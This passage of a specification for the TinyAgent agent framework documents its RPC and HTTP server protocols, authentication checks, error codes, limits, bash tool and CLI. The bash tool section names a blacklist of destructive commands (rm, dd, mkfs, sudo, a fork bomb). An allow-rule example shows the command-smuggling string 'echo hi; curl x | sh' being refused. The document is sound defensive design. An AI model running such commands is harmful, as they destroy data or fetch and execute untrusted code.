- No command about a session is answered until its storage has finished loading.
- By the time a client reads the terminal `agent_end` line, the session is
  already idle: the next `prompt` is accepted, `get_state` says `idle`, and
  `abort` returns `accepted: false`. The run is released before the final event
  is delivered, never after.
- EOF on stdin and SIGINT cancel the active run, deliver its
  `tool_execution_end` and `agent_end`, and exit within 5 seconds. No
  interactive break menu is shown.
- An input line over the line limit emits `line_too_large` and terminates RPC
  mode. Invalid UTF-8 emits `invalid_utf8` and terminates.
- An output object over the line limit is replaced by a protocol error
  `output_too_large`, and the active run is cancelled. Asynchronous output
  exceeding the queue limit emits `output_queue_full` and cancels the active
  run.

## HTTP server

```sh
tinyagent serve
```

Server mode wraps one configured agent. A native SDK also exposes an idiomatic
`serve(agent, options)`; tool handlers then execute in the process that called
it. Each session has independent history and at most one active run. Separate
sessions run concurrently.

### Routes

| Route | Request body | Success |
|---|---|---|
| `GET /health` | | `200` `{"status":"ok","protocolVersion":2}` |
| `GET /sessions` | | `200` `{"sessionIds":[...]}`, open and stored, sorted |
| `POST /sessions` | none, or `{"sessionId":"s_..."}` to reopen a stored session | `201` `{"sessionId":"s_..."}` |
| `GET /sessions/:id?offset=0&limit=20&view=history` | | `200` a history page, as `get_history` |
| `DELETE /sessions/:id` | | `204`, empty |
| `POST /sessions/:id/prompts` | `{"message", "messageId"?, "detach"?}` | `200` JSONL event stream |
| `POST /sessions/:id/resume` | optional `{"result"}` or `{"error"}`, `"detach"?` | `200` JSONL event stream |
| `POST /sessions/:id/abandon` | optional `{"reason"}` | `200` `{"abandoned":true}` |
| `POST /sessions/:id/cancel` | | `200` `{"accepted","runId"}` |
| `POST /sessions/:id/compact` | | `200` JSONL: `compaction_start`, `compaction_end` |
| `POST /sessions/:id/reconcile` | `{"note":"..."}` | `200` `{"recoveryRequired":false}` |
| `GET /sessions/:id/events?after=0&limit=100` | | `200` `{"events","nextAfter"}`, as `get_events` |
| `GET /sessions/:id/events?after=N&follow=1` | | `200` JSONL event stream |

A session ID in a path refers to a session this server has open. A stored
session is opened with `POST /sessions` first. The server never resumes open
runs on its own at startup: a client reopens the session and posts to
`/resume`.

A request body, where one is required, must be `application/json`, valid UTF-8,
and a JSON object. A query option given twice is refused.

```json
{"sessionId":"s_2bdb...","history":[],"recoveryRequired":false,"resumable":false,"paused":null,"nextOffset":null,"recoveryNotes":[]}
```

### Streams

A stream response has `Content-Type: application/jsonl; charset=utf-8`. The
body is the event objects of the run, one per line. For a prompt or resume the
first line is `agent_start` and the last is `agent_end`. Compaction events
inside a prompt or resume stream are ordinary events; only the run's
`agent_end` ends the stream. `compaction_end` is terminal only for
`POST /sessions/:id/compact`.

The status line waits for the run's first event. A request the session refuses
before that is answered with ordinary JSON and the right status, including for
detached requests:

```json
{"error":{"code":"session_busy","message":"The session already has an active run","retryable":true}}
```

Failures after streaming starts are reported by the terminal `agent_end`,
because the status has already been sent. An event over the line limit is
replaced by a failed `agent_end` with `error.code` `output_too_large`.

By the time the response body ends, the session is idle: the next prompt is
accepted and `cancel` returns `accepted: false`.

`POST /sessions/:id/cancel` cooperatively cancels the active run and is
idempotent. It returns `accepted: false` with a null `runId` when no run is
active. The stream's `agent_end` confirms that cancellation finished.

`DELETE /sessions/:id` cancels any active run, waits for it to stop, releases
the session and keeps its journal.

### Detach and follow

Without `detach`, disconnecting from a prompt or resume response cancels its
run.

With `"detach": true` in the body of `prompts` or `resume`, the run is not
cancelled when the client disconnects. It runs to its end and is cancelled only
by `POST /sessions/:id/cancel`, deletion of the session, or server shutdown.
The response still streams events for as long as the client stays connected.

`GET /sessions/:id/events?after=N&follow=1` is how a client comes back. It
streams JSONL:

1. the journal-derived events with cursor greater than N;
2. then, if a run is active, the live events of the turn in progress that no
   journal record covers yet (text deltas, without a cursor);
3. then that run's live events as they happen, ending after its `agent_end`.

If no run is active it ends after the replay.

- No event is delivered twice.
- A follower never loses the terminal event: if a run is active or committing
  when the follower joins, the follower receives that run's `agent_end` before
  the stream closes.
- The server keeps the active run's uncovered live events in memory, bounded
  by the queued-output limit. After a process crash that buffer is gone, which
  is fine because resume continues from the journal.
- A follower never slows the run. Replay honours backpressure, and a follower
  with more than the queued-output limit waiting is disconnected.
- An explicit compaction cannot be followed.

RPC mode has no detach: EOF on stdin cancels the run.

### Status codes

```text
200  success, or a stream
201  session created
204  session deleted
400  malformed request
401  missing or invalid bearer token
403  Origin not allowed
404  unknown session or route
409  the session cannot do this now
413  request body too large
415  unsupported content type
421  Host header does not name this server
500  failure before streaming starts
503  server is shutting down
```

Every refusal has a JSON error body with `code`, `message` and `retryable`.
The codes are listed under [Error codes](#error-codes).

## Authentication and exposure

Servers bind to `127.0.0.1` by default and do not enable CORS. Binding to a
non-loopback address requires both an explicit remote-exposure option and a
bearer token; a server refuses to start remotely without both. The host is an
IP address or `localhost`.

Authenticated requests use:

```text
Authorization: Bearer <token>
```

### Host and Origin checks

A server that can run shell commands must not be reachable from a web page
through DNS rebinding or a cross-site request. Two checks apply to every route,
with or without a token, before the token is looked at:

1. **Host.** The `Host` header, without its port, must be the address the
   server is bound to, or `localhost` or a loopback literal when it is bound to
   loopback, or a name in `allowedHosts`. Otherwise `421`
   `misdirected_request`.
2. **Origin.** A request carrying an `Origin` header whose value is not in
   `allowedOrigins` is refused with `403` `origin_not_allowed`. The default
   list is empty, so by default every request with an `Origin` header is
   refused.

Order of checks: Host, Origin, bearer token, shutting down, route.

Session IDs are cryptographically random and are not credentials. One token
owns every session in a server. Multi-user ownership is out of scope.

Local mode may use HTTP. Remote deployments terminate HTTPS in a trusted
reverse proxy. TinyAgent does not implement TLS.

## Error codes

### Run errors

Carried in `agent_end.error` as `{code, message, retryable}`, and stored in
the `run_failed` record.

| Code | When | Retryable |
|---|---|---|
| `provider_error` | The model request failed, the retries were exhausted, the stream broke or ended without a turn, or any failure that has no other name. | `true` after 429, 5xx or a connection failure; `false` after a 4xx such as 401 |
| `limit_exceeded` | `maxSteps`, `maxSeconds` or `maxTokens` was reached. Carries `limit`. | no |
| `repeated_tool_errors` | Three consecutive model turns in which every tool call failed. | no |
| `hook_error` | `beforeTool` or `afterTool` failed or returned something unusable. | no |
| `output_missing` | With `outputSchema`, the model answered in text twice without calling `final_output`. | no |
| `storage_error` | An append failed or returned the wrong sequence. | no |
| `session_fenced` | Another writer appended to the session first. | no |
| `abandoned` | The run was ended by `abandon`. Seen in replay and records. | no |
| `output_too_large` | HTTP only: an event exceeded the line limit. | no |

`model_request_end.error.code` is `provider_error`, or `aborted` when the run
was cancelled.

### RPC command errors

Carried in an error response, or in a `protocol_error` when the command had no
`id`. RPC errors have no `retryable` field.

| Code | When |
|---|---|
| `busy` | A run is active and the command needs an idle session. |
| `invalid_command` | Unknown `type`, non-string `id`, a missing or malformed `message` or `messageId`, a command that is not an object, or a run option, prompt content or resume input refused before the run started. Over HTTP the same refusals are `400` `invalid_request`. |
| `resume_required` | `prompt` while a run is open or paused. |
| `nothing_to_resume` | `resume_run` or `abandon_run` with no open run. |
| `session_error` | Unknown session, missing storage or budget, invalid paging options, a reconcile that is not needed, or a session awaiting reconciliation. |
| `session_failed` | The session's storage failed earlier. Reopen the session. |
| `session_fenced`, `storage_error` | The command's own append was fenced or failed. |
| `session_closed` | The RPC adapter is closing. |

### RPC protocol errors

| Code | When | RPC mode continues |
|---|---|---|
| `invalid_json` | A line is not JSON. | yes |
| `invalid_command` | Not an object, a non-string `id`, or an unknown command without `id`. | yes |
| `line_too_large` | An input line exceeds the line limit. | no |
| `invalid_utf8` | An input line is not UTF-8. | no |
| `output_too_large` | An output object exceeded the line limit; the run is cancelled. | yes |
| `output_queue_full` | Queued output exceeded its limit; the run is cancelled. | yes |

### HTTP errors

`retryable` is true for `session_busy` on an active run and for every 5xx
status, and false otherwise.

| Status | Code | When |
|---|---|---|
| 400 | `invalid_request` | Malformed framing, body not an object, missing or malformed `message`, `messageId`, `note`, `reason`, `result` or `error`, bad or duplicated query options, a reconcile that is not needed. |
| 400 | `invalid_json` | The body is not valid UTF-8 JSON. |
| 400 | `budget_required` | Compaction without a context budget. |
| 401 | `unauthorized` | Missing, duplicated or wrong bearer token. |
| 403 | `origin_not_allowed` | `Origin` header not in `allowedOrigins`. |
| 404 | `not_found` | Unknown route or method. |
| 404 | `session_not_found` | The session is not open in this server, or the stored session does not exist. |
| 409 | `session_busy` | The session has an active run, or is already open. |
| 409 | `session_closed` | The session is closing. |
| 409 | `recovery_required` | Inspect history, then reconcile. |
| 409 | `resume_required` | A prompt while a run is open or paused. |
| 409 | `nothing_to_resume` | Resume or abandon with no open run. |
| 409 | `session_fenced` | Another writer appended first. |
| 409 | `session_failed` | The session's storage failed. Reopen it. |
| 409 | `session_corrupt` | The stored journal is invalid. |
| 413 | `request_too_large` | The body exceeds the body limit. |
| 415 | `unsupported_media_type` | A required body is not `application/json`. |
| 421 | `misdirected_request` | The `Host` header does not name this server. |
| 500 | `internal_error` | Unexpected failure before streaming starts. |
| 503 | `server_closing` | The server is shutting down. |

## Session and cancellation rules

- One session permits one active operation. Separate sessions may run
  concurrently.
- A completed run atomically commits its history. A failed, aborted or
  abandoned run leaves committed history unchanged.
- Cancellation propagates to the provider request and the active tool.
- The bash tool terminates its child process group on cancellation.
- Custom tools, hooks, providers and event callbacks should honour
  cancellation. One that does not is abandoned after one second.
- Server shutdown cancels every active run, detached or not.
- Closing a session cancels its run, waits a bounded time, and releases the
  storage. It never deletes data.

## Limits

Measured in UTF-8 bytes. The JSONL line limit excludes its LF. The queue limit
includes complete framed lines and their LFs.

```text
JSONL line, excluding LF        1,048,576
HTTP request body               1,048,576
queued asynchronous output      4,194,304
tool output or tool error         131,072
events or history page          1,044,480   (line limit less 4,096)
bash output kept, per stream       30,000
provider error text                   500 characters
content nesting                        32 levels
maxSeconds, timeoutSeconds         86,400 seconds
provider attempts                       4
Retry-After honoured up to             30 seconds
grace after cancel or timeout           1 second
RPC exit after EOF or SIGINT            5 seconds
events page limit                 1..1000, default 100
history page limit                1..1000, default 20
```

A synchronous writer has no in-memory output queue. An asynchronous writer
applies backpressure within the queue limit or rejects output that would
exceed it.

## The bash tool and the CLI

The coding CLI is a small agent with one tool, `bash`. The tool is also
exported for use in a host's own agent. Its destructive-command blacklist is a
guardrail against accidents. It is not a sandbox.

### Bash tool

The tool takes `{"command": "<string>"}` and runs it with `bash -c` in its own
process group. Its output is:

```text
exit_code: 0
stdout:
hi
stderr:
```

Factory options:

| Option | Meaning |
|---|---|
| `cwd` | Working directory for every command. |
| `env` | Variables merged over the process environment. |
| `timeoutSeconds` | Kill the command after this long. The CLI uses 120. |
| `approve(command)` | Returns allow, or deny with an optional reason. |

- **Blacklist.** A command on the blacklist (`rm`, `rmdir`, `unlink`, `shred`,
  `truncate`, `dd`, `mkfs`, `wipefs`, `fdisk`, `parted`, `sudo`, `doas`,
  `shutdown`, `reboot`, `poweroff`, `halt`, `kill`, `pkill`, `killall`,
  `find -delete`, `git clean`, `git restore`, `git reset --hard`,
  `git checkout --`, a fork bomb) is not run. The result is a tool error
  (`isError: true`) whose output begins `exit_code: 126`:

  ```json
  {"type":"tool_execution_end","runId":"r_...","sequence":3,"toolCallId":"call_s4_0_0","toolName":"bash","output":"exit_code: 126\nstdout:\n\nstderr:\nblocked: 'rm' is denied\n","isError":true,"cursor":15}
  ```

  The blacklist applies in every mode and is checked before `approve`.
- **Truncation.** Output over 30,000 bytes is not an error and the process is
  not killed for it. For stdout and stderr separately, the first 15,000 and
  last 15,000 bytes are kept, cut on UTF-8 boundaries, with
  `\n[... N bytes elided ...]\n` between them. Output is decoded with
  replacement first and truncated second, so binary output cannot exceed the
  limit.
- **Timeout.** On timeout the process group is killed and the result is a tool
  error: the output captured so far followed by a final line
  `[timed out after N s]`.
- **Cancellation** kills the process group.
- **Detached children.** After the shell exits, or the call is cancelled or
  times out, output readers have one second before the pipes are closed, so a
  detached grandchild holding the pipes cannot block the call.
- **Approval.** A denial becomes the tool error `Rejected by user: <reason>`
  (or `Rejected by user` without a reason), so the model can adapt.

### CLI modes

```text
tinyagent                       interactive prompt
tinyagent -p "task"             one-shot (also --prompt)
tinyagent --mode rpc            RPC
tinyagent serve                 HTTP server
tinyagent --list-sessions       print stored session IDs
```

| Flag | Meaning |
|---|---|
| `-p`, `--prompt <task>` | Run one session run, stream its text to stdout, exit 0 if it completed and 1 otherwise. |
| `--resume <sessionId>` | Open a stored session. In interactive and one-shot mode, an open run that is not paused is resumed first. |
| `--max-steps`, `--max-seconds`, `--max-tokens` | Run limits. |
| `--cwd <directory>` | Where bash commands run. |
| `--yolo` | Run commands without asking. |
| `--allow <regex>` | Repeatable. Auto-approve matching commands. |

**Approval.** The interactive CLI asks before each command: `y` runs it, `n`
rejects it, any other text rejects it with that text as the reason, and `a`
allows every command for the rest of the session. The prompt shows control
characters escaped (ESC, CR, backspace and the like), so the person sees
exactly what will run.

**The whole-command allow rule.** `--allow <regex>` approves a command only
when the pattern matches the whole command, and never when the command contains
any of `; & | $ < > ( )`, a backtick, a backslash, CR or LF. So
`--allow 'echo .*'` cannot approve `echo hi; curl x | sh`. A command that is
not auto-approved is asked about as usual.

**One-shot mode** cannot ask. Without `--yolo` or a matching `--allow`, every
command is rejected with a message saying so.

**RPC and HTTP modes** never ask. They run with the blacklist only.

The interactive prompt has `/history`, `/compact`, `/reconcile <note>`,
`/resume` and `/abandon`.

### Environment variables

Read by the CLI entry only.

| Variable | Meaning |
|---|---|
| `TINYAGENT_PROVIDER` | `openai` (default), `anthropic` or `chat`. |
| `OPENAI_API_KEY`, `ANTHROPIC_API_KEY` | The provider's key. |
| `TINYAGENT_BASE_URL` | The provider's base URL. |
| `TINYAGENT_MODEL` | Model name. |
| `TINYAGENT_SESSION_DIR` | Where sessions are stored. Default `.tinyagent/sessions` under the current directory. |
| `TINYAGENT_CONTEXT_TOKENS` | Turns on compaction with this context size. |
| `TINYAGENT_RESPONSE_RESERVE` | Room kept for the answer. Default 4096. |
| `TINYAGENT_MAX_STEPS`, `TINYAGENT_MAX_SECONDS`, `TINYAGENT_MAX_TOKENS` | The limits, when the flag is absent. |
| `TINYAGENT_YOLO` | `1` is `--yolo`. |
| `TINYAGENT_HOST`, `TINYAGENT_PORT` | `serve` address. Default `127.0.0.1:8080`. |
| `TINYAGENT_TOKEN` | Bearer token for `serve`. |
| `TINYAGENT_ALLOW_REMOTE` | `1` permits a non-loopback bind, with a token. |
| `TINYAGENT_ALLOWED_HOSTS`, `TINYAGENT_ALLOWED_ORIGINS` | Comma-separated additions for the Host and Origin checks. |

The CLI's token counter for compaction is a rough estimate from the byte
length of the request.

## Invariants

Every implementation upholds these in every state, including after a crash, a
cancellation, a client disconnect or a provider fault.

1. **Streams are well formed.** Every `tool_execution_start` has exactly one
   matching `tool_execution_end`; there is no end without a start; one tool
   runs at a time; a stream has one terminal event, last, and nothing after it.
2. **Provider requests are well formed.** No tool result without its call, no
   call without a result, no call or result twice, and the request ends in a
   user message or a tool result. An empty assistant turn is never sent.
3. **Effects happen at most once per call.** A non-idempotent tool runs at
   most once per tool call. A call whose `tool_execution_end` reported success
   ran exactly once, including across a crash and resume. A fenced writer never
   executes a tool.
4. **One outcome, and the journal is the truth.** A run reaches one terminal
   state. `get_state`, the history page and replay agree with it. What RPC and
   HTTP report as the end of a run is what the journal holds.
5. **Nothing hangs.** Every command and request gets an answer. Every wait on
   host code is bounded after cancellation. RPC mode exits within 5 seconds of
   EOF or SIGINT.
6. **Replay is stable.** `sequence` and `cursor` strictly increase; paging in
   small pages gives the same events as one large page; a follower never
   receives an event twice and never misses the terminal event.
7. **The session stays usable.** After any failure the session accepts a new
   prompt, or reports `resumable`, `paused` or `recoveryRequired` and the
   matching way out (`resume`, `abandon`, `reconcile`) works. The next model
   request carries no trace of a run that did not commit.
8. **Nothing is left running.** After the process exits, neither it nor any
   command it started is still running.
9. **When the end is visible, the session is idle.** The run is released
   before the terminal event is delivered or the body is closed.
10. **Intent before execution.** No tool runs, runs again, or is answered
    before the record that announces it has been durably appended.
11. **Secrets and context stay out.** No header value, API key or run
    `context` appears in an event, error, log or journal record.
12. **Imports are inert.** Importing and constructing perform no I/O.

## Conformance

Three layers test this contract:

1. Each language's own unit suite, offline, with fake providers.
2. The shared fixtures in the repository's `conformance/` directory: the
   version 1 RPC scenarios and limits in
   [`conformance/rpc_v1.json`](conformance/rpc_v1.json), tool argument
   validation cases, and provider SSE transcripts.
3. The black-box harness in the repository's `conformance/blackbox/`
   directory, which drives a
   language's CLI over RPC, HTTP and one-shot mode against a scripted fake
   provider, injects crashes, provider faults, cancellations and disconnects,
   and checks invariants 1 to 8 after every step.

What the harness cannot see through a CLI whose only tool is a non-idempotent
bash is left to each language's own suite: the Storage interface and custom
stores, `session_fenced`, idempotent rerun, `onUncertain: "reconcile"`, hooks,
pause and resume with a value, typed output, `context`, `headers` and `extra`,
trace events, tool timeouts, and the embedding guarantees.

A language is at version 2 when it passes all three.

## Implementation-specific details

Two things are deliberately not part of the contract, and a client must not
depend on them:

- Journal records carry language-specific fields beyond those listed under
  [The journal](#the-journal), visible through `view=records`.
- Error message texts differ between implementations. Codes, statuses and
  event fields are stable; wording is not.

## Deliberately not included

- Parallel tool calls.
- An MCP client.
- Handoff or orchestration primitives; multiple configured agents in one server.
- Graphs or workflow engines.
- Memory or retrieval.
- A guardrail framework.
- An OpenTelemetry dependency.
- Dollar costs and a model registry.
- UI stream protocols and a built-in TUI.
- Built-in file or web tools.
- Prompt queues and steering.
- Executable tool code accepted over RPC or HTTP.
- Provider switching inside a session; journals portable between languages.
- Built-in TLS and multi-user ownership.

Each version 2 guide has a short recipe for the common ones: an agent as a
tool, MCP tools mapped to `Tool`, OpenTelemetry spans from events, and a cost
estimate from usage.
